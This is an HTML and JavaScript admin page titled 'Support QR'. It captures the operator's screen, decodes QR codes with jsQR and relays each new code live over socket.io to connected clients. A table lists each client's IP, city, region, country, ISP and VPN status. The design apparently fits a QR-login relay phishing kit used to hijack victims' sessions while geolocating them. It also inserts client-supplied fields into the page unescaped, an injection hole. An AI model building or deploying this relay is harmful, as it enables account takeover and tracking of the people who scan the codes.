<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Admin Panel - Support QR</title>
<script src="/socket.io/socket.io.js"></script>
<script src="https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
<style>
body {
  font-family: Arial, sans-serif;
  background: #f5f5f5;
  margin: 0;
  display: flex;
  flex-direction: column;
  align-items: center;
  padding: 20px;
}
h2 { margin-bottom: 10px; }
.controls { display: flex; gap: 10px; margin-bottom: 15px; flex-wrap: wrap; justify-content:center;}
button {
  padding: 8px 16px;
  border: none;
  border-radius: 6px;
  background: #0078ff;
  color: white;
  font-weight: bold;
  cursor: pointer;
}
button:hover { background: #005ed1; }
button.stop { background: #d9534f; }
button.stop:hover { background: #c9302c; }
button.freeze { background: #f0ad4e; color:black;}
button.freeze:hover { background: #ec971f; }

#qrPreview {
  margin-top: 15px;
  background: white;
  padding: 20px;
  border-radius: 10px;
  box-shadow: 0 0 6px rgba(0,0,0,0.1);
  min-width: 260px;
  min-height: 260px;
  display: flex;
  align-items: center;
  justify-content: center;
}
#videoContainer {
  margin-top: 15px;
  background: #000;
  border-radius: 10px;
  overflow: hidden;
  box-shadow: 0 0 6px rgba(0,0,0,0.2);
}
#video {
  width: 640px;
  height: 360px;
  display: block;
  object-fit: cover;
}
#clientTable {
  width: 100%;
  max-width: 800px;
  margin-top: 25px;
  border-collapse: collapse;
  font-size: 0.9rem;
}
#clientTable th, #clientTable td {
  border: 1px solid #ddd;
  padding: 6px 8px;
  text-align: center;
}
#clientTable th { background: #e6e6e6; }
.status { font-weight: bold; color: #0078ff; }
</style>
</head>
<body>
  <h2>Admin Panel - Support QR</h2>
  <div class="controls">
    <button id="startBtn">Start Stream</button>
    <button id="stopBtn" class="stop">Stop Stream</button>
    <button id="hideBtn">Hide</button>
    <button id="freezeBtn" class="freeze">Freeze</button>
  </div>
  <div id="qrPreview">No active QR</div>
  <div class="status" id="statusText">Status: Inactive</div>

  <div id="videoContainer">
    <video id="video" autoplay muted playsinline></video>
  </div>
  <canvas id="canvas" style="display:none;"></canvas>

  <table id="clientTable">
    <thead>
      <tr>
        <th>Name</th>
        <th>IP</th>
        <th>City</th>
        <th>Region</th>
        <th>Country</th>
        <th>ISP</th>
        <th>VPN</th>
        <th>Ping (ms)</th>
      </tr>
    </thead>
    <tbody id="clientBody"></tbody>
  </table>

<script>
const socket = io();
let isStreaming = false;
let isHidden = false;
let isFrozen = false;
let currentQR = null;
let stream = null;
let detectLoop = null;
let scanInterval = 500; // 0.5 sec default

const startBtn = document.getElementById('startBtn');
const stopBtn = document.getElementById('stopBtn');
const hideBtn = document.getElementById('hideBtn');
const freezeBtn = document.getElementById('freezeBtn');
const qrPreview = document.getElementById('qrPreview');
const statusText = document.getElementById('statusText');
const clientBody = document.getElementById('clientBody');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d', { willReadFrequently: true });

socket.emit('join', 'admin');

socket.on('state', (s) => {
  isStreaming = s.isStreaming;
  isHidden = s.isHidden;
  currentQR = s.currentQrValue;
  updateStatus();
  updatePreview();
});

socket.on('client_list', updateClients);

socket.on('qr_preview', (val) => {
  if (!isStreaming || isFrozen) return;
  if (!isHidden && val) {
    currentQR = val;
    qrPreview.innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=${encodeURIComponent(val)}" alt="QR">`;
  }
});
socket.on('hide_state', (hidden) => {
  isHidden = hidden;
  updateStatus();
  updatePreview();
});

function updateStatus() {
  const states = [];
  if (isStreaming) states.push('Streaming');
  if (isHidden) states.push('Hidden');
  if (isFrozen) states.push('Frozen');
  statusText.textContent = `Status: ${states.length ? states.join(' / ') : 'Inactive'}`;
}

function updatePreview() {
  if (isHidden) {
    qrPreview.textContent = 'QR is hidden';
  } else if (!currentQR) {
    qrPreview.textContent = 'No active QR';
  } else {
    qrPreview.innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=${encodeURIComponent(currentQR)}" alt="QR">`;
  }
}

async function detectLoopStart() {
  if (detectLoop) clearInterval(detectLoop);
  detectLoop = setInterval(() => {
    if (!isStreaming || isFrozen || !video.videoWidth) return;
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const img = ctx.getImageData(0, 0, canvas.width, canvas.height);
    const code = jsQR(img.data, img.width, img.height);
    if (code && code.data && code.data !== currentQR) {
      currentQR = code.data;
      if (!isHidden) {
        qrPreview.innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=${encodeURIComponent(code.data)}" alt="QR">`;
      }
      socket.emit('qr_update', code.data);
    }
  }, scanInterval);
}

startBtn.onclick = async () => {
  try {
    stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
    video.srcObject = stream;
    socket.emit('start_stream');
    isStreaming = true;
    updateStatus();
    detectLoopStart();
  } catch (err) {
    alert('Screen sharing failed: ' + err.message + '\n\nMake sure:\n1. You are on HTTPS\n2. You clicked Start manually\n3. You allowed screen share permission');
  }
};

stopBtn.onclick = () => {
  if (detectLoop) clearInterval(detectLoop);
  if (stream) stream.getTracks().forEach(t => t.stop());
  socket.emit('stop_stream');
  isStreaming = false;
  currentQR = null;
  updatePreview();
  updateStatus();
};

hideBtn.onclick = () => {
  isHidden = !isHidden;
  socket.emit('toggle_hide', isHidden);
  hideBtn.textContent = isHidden ? 'Unhide' : 'Hide';
  updateStatus();
  updatePreview();
};

freezeBtn.onclick = () => {
  isFrozen = !isFrozen;
  freezeBtn.textContent = isFrozen ? 'Unfreeze' : 'Freeze';
  updateStatus();
};

function updateClients(list) {
  clientBody.innerHTML = '';
  list.forEach(c => {
    const tr = document.createElement('tr');
    tr.innerHTML = `
      <td>${c.username}</td>
      <td>${c.ip}</td>
      <td>${c.city}</td>
      <td>${c.region}</td>
      <td>${c.country} ${c.countryFlag || ''}</td>
      <td>${c.isp}</td>
      <td>${c.vpn ? 'Yes' : 'No'}</td>
      <td>${c.ping}</td>
    `;
    clientBody.appendChild(tr);
  });
}
</script>
</body>
</html>
